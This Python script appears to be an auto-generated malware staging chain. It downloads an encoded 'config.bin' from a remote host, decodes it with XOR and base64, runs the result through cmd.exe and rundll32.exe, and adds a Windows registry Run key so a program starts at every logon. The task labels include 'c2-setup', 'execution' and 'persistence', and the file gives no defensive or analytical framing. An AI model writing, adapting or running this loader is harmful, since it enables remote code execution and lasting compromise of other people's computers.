#!/usr/bin/env python3
import sys
import json
import time
import requests
import base64
import subprocess
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'content': None}
    try:
        url = "https://remote-server.com/config.bin"  # Example URL, replace with actual
        response = requests.get(url, stream=True, timeout=30)
        
        if response.status_code == 200:
            with open("config.bin", "wb") as f:
                for chunk in response.iter_content(8192):
                    f.write(chunk)
            
            # Verify file exists and size > 0
            if f.tell() > 0:
                with open("config.bin", "rb") as f:
                    file_content = f.read()
                result['content'] = file_content.hex()
            else:
                return {'success': False, 'data': result,
                        'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
        else:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Retrieve the content from input_data and convert from hex
        content = bytes.fromhex(input_data.get('content', ''))
        
        # XOR key for decoding
        xor_key = b'\xAA'  # Example XOR key, replace with actual key if known
        
        # Decode using XOR
        decoded_bytes = bytes(b ^ xor_key[0] for b in content)
        
        # Decode using base64
        decoded_data = base64.b64decode(decoded_bytes)
        
        # Prepare the result
        result = {
            'decoded_data': decoded_data.hex()
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract and decode the input data
        decoded_data = bytes.fromhex(input_data.get('decoded_data', ''))

        # Execute the decoded content using cmd.exe
        cmd_result = subprocess.run(
            ['cmd.exe', '/c', decoded_data.decode()],
            capture_output=True, text=True, timeout=30
        )

        # Check the return code of the cmd execution
        if cmd_result.returncode != 0:
            # Log the error but continue
            print(f"cmd.exe execution failed: {cmd_result.stderr}")

        # Attempt to execute using rundll32.exe
        rundll_result = subprocess.run(
            ['rundll32.exe', decoded_data.decode(), 'entrypoint'],
            capture_output=True, timeout=30
        )

        # Check the return code of the rundll32 execution
        if rundll_result.returncode != 0:
            # Log the error and return success=False
            print(f"rundll32.exe execution failed: {rundll_result.stderr}")
            return {'success': False, 'data': {},
                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # If both executions are successful or handled, return success=True
        return {'success': True, 'data': {},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        registered = False
        if input_data.get('success', False):
            # Define the registry path and the name of the entry
            registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            entry_name = 'MyPersistentScript'
            exe_path = r'C:\Path\To\Your\Script.exe'  # Path to the script to run on logon

            # Open the registry key
            # The winreg module is only available on Windows, so this code will only work on Windows
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
                # Set the value in the registry
                winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, exe_path)
                
                # Verify by reading back the value
                registered_value, _ = winreg.QueryValueEx(key, entry_name)
                if registered_value == exe_path:
                    registered = True

        result = {'registered': registered}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'registered': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Retrieve Configuration File [c2-setup] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Retrieve Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Retrieve Configuration File): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Decode Configuration File [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decode Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Execute Decoded Content [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Decoded Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Decoded Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))